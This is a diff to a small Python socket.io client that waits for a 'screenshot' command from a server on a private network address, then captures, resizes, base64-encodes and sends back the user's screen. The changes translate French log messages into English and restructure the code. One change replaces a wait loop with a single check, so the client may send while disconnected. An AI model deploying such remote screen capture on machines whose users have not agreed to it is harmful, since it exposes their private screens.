@@ -8,32 +8,37 @@ from PIL import Image
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2)
 
 
+def log_event(message):
+    print(message)
+
+
 @sio.event
 def connect():
-    print("Connexion ouverte")
+    log_event("Connection opened")
 
 
 @sio.event
 def connect_error(data):
-    print(f"La connexion a échoué : {data}")
+    log_event(f"Connection failed: {data}")
 
 
 @sio.event
 def disconnect():
-    print("Connexion fermée")
+    log_event("Connection closed")
 
 
 @sio.event
 def command(data):
-    if data.get('command') == 'screenshot':
-        print("Capture d'écran demandée")
+    command = data.get('command')
+    if command == 'screenshot':
+        log_event("Screenshot requested")
         take_and_send_screenshot()
     else:
-        print(f"Commande non reconnue: {data}")
+        log_event(f"Unrecognized command: {command}")
 
 
-def resize_image(image, base_width=1300):
-    img = Image.open(image)
+def resize_image(image_bytes_io, base_width=1300):
+    img = Image.open(image_bytes_io)
     w_percent = (base_width / float(img.size[0]))
     h_size = int((float(img.size[1]) * float(w_percent)))
     img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
@@ -52,20 +57,23 @@ def take_and_send_screenshot():
         resized_screenshot = resize_image(screenshot_bytes_io)
         screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
 
-        while not sio.connected:
-            print("En attente de connexion pour envoyer la capture d'écran...")
+        if not sio.connected:
+            log_event("Waiting for connection to send the screenshot...")
             time.sleep(1)
         sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
-        print("Capture d'écran envoyée")
+        log_event("Screenshot sent")
     except Exception as e:
-        print(f"Erreur lors de la prise ou de l'envoi de la capture d'écran : {e}")
+        log_event(f"Error taking or sending the screenshot: {e}")
 
 
-if __name__ == '__main__':
+def main():
     try:
-        # sio.connect('http://127.0.0.1:5000')
         sio.connect('http://192.168.220.129:5000')
         sio.wait()
     except KeyboardInterrupt:
-        print("Arrêt du client sur demande de l'utilisateur.")
+        log_event("Client stopped by user request.")
         sio.disconnect()
+
+
+if __name__ == '__main__':
+    main()
